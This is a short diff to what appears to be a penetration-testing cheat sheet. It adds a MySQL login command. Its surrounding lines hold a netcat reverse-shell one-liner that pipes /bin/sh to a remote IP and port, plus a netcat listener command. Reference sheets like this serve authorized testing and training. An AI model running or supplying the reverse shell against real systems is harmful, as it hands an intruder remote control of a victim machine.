@@ -165,6 +165,10 @@ Run
 
 ```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : reverse shell
 
+# MySQL
+
+```mysql -u username -p password -h ip``` : connect to mysql service with username and password
+
 # NETCAT
 
 ```nc -lvnp 192.168.1.1 8181``` : Create listener 
